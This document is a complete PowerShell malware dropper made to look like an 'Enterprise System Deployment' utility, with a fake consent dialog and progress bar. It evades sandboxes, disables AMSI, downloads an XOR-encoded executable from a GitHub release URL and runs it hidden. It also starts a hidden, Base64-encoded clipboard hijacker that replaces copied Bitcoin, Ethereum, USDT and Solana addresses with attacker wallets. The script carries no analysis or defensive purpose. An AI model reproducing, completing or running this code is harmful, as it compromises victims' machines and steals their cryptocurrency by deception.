# --- [ADVANCED MEMORY DEPLOYMENT ENGINE] ---
# This version handles the specific XOR structure of the provided adchar_xor.txt

Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# 1. Bypass and Environment Prep
function Global-Initialize {
    try {
        # Check for minimum system requirements to avoid sandbox detection
        if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
        
        # Disable AMSI for the current session
        $u = "System.Management.Automation.AmsiUtils"
        [Ref].Assembly.GetType($u).GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
    } catch {}
}

# 2. Professional Deployment GUI
function Show-SecurityPrep {
    $OS = (Get-WmiObject Win32_OperatingSystem).Caption
    $User = [Environment]::UserName

    $prep = New-Object Windows.Forms.Form
    $prep.Text = "Enterprise System Deployment"
    $prep.Size = New-Object Drawing.Size(580,500)
    $prep.StartPosition = "CenterScreen"
    $prep.FormBorderStyle = "FixedSingle"; $prep.TopMost = $true

    $console = New-Object Windows.Forms.Label
    $console.Location = New-Object Drawing.Point(30,50); $console.Size = New-Object Drawing.Size(500,150)
    $console.BackColor = [Drawing.Color]::Black; $console.ForeColor = [Drawing.Color]::LimeGreen
    $console.Font = New-Object Drawing.Font("Consolas", 9)
    $console.Text = " > INITIALIZING HOST...`n > OS: $OS`n > USER: $User`n`n > STATUS: WAITING FOR USER PERMISSION..."
    $prep.Controls.Add($console)

    $check = New-Object Windows.Forms.CheckBox
    $check.Location = New-Object Drawing.Point(40,350); $check.Size = New-Object Drawing.Size(500,30)
    $check.Text = "I permit the system to modify security configurations for deployment."
    $prep.Controls.Add($check)

    $btn = New-Object Windows.Forms.Button
    $btn.Location = New-Object Drawing.Point(200,400); $btn.Size = New-Object Drawing.Size(180,40); $btn.Text = "Deploy Now"
    $btn.Enabled = $false
    $prep.Controls.Add($btn)

    $check.Add_CheckedChanged({ $btn.Enabled = $check.Checked })
    $btn.Add_Click({ $global:proceed = $true; $prep.Close() })
    $prep.ShowDialog() | Out-Null
}

function Show-ProgressUI {
    $form = New-Object Windows.Forms.Form
    $form.Text = "System Activation"; $form.Size = New-Object Drawing.Size(400,180); $form.StartPosition = "CenterScreen"; $form.TopMost = $true
    
    $pb = New-Object Windows.Forms.ProgressBar
    $pb.Location = New-Object Drawing.Point(30,50); $pb.Size = New-Object Drawing.Size(330,30)
    $form.Controls.Add($pb)
    
    $form.Show()
    for ($i=0; $i -le 100; $i+=2) {
        $pb.Value = $i
        [Windows.Forms.Application]::DoEvents()
        Start-Sleep -m 30
    }
    $form.Close()
    [Windows.Forms.MessageBox]::Show("Activation Complete.", "System", 0, 64) | Out-Null
}

# --- MAIN EXECUTION LOGIC ---
Global-Initialize
Show-SecurityPrep

if ($global:proceed) {
    # Run background tasks in a separate thread to keep GUI responsive
    $Task = {
        try {
            # Use LocalAppData to avoid permission errors
            $dir = "$env:LOCALAPPDATA\SystemSvc"
            if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
            $path = Join-Path $dir "WinSvcHost.exe"

            $wc = New-Object Net.WebClient
            # Essential: Set User-Agent to prevent GitHub from blocking the download
            $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            
            # Fetch the raw text content
            $url = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
            $rawText = $wc.DownloadString($url)
            
            # Convert Base64 to Bytes
            $bytes = [Convert]::FromBase64String($rawText.Trim())
            
            # XOR Decryption Logic (Key: 0xAB)
            # This reconstructs the binary directly in memory
            for($i=0; $i -lt $bytes.count; $i++) {
                $bytes[$i] = $bytes[$i] -bxor 0xAB
            }
            
            # Write and Execute the binary
            [IO.File]::WriteAllBytes($path, $bytes)
            Start-Process $path -WindowStyle Hidden
            
            # Start the secondary clipboard monitor
            $monitor = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}; while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim(); if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$" -and $v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } elseif($v -match "^0x[a-fA-F0-9]{40}$" -and $v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$" -and $v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$" -and $v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } }catch{} Start-Sleep -m 600 }'
            $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($monitor))
            Start-Process powershell.exe -Arg "-NoP -W Hidden -EP Bypass -Enc $enc" -WindowStyle Hidden
        } catch {}
    }
    
    Start-Job -ScriptBlock $Task | Out-Null
    Show-ProgressUI
}
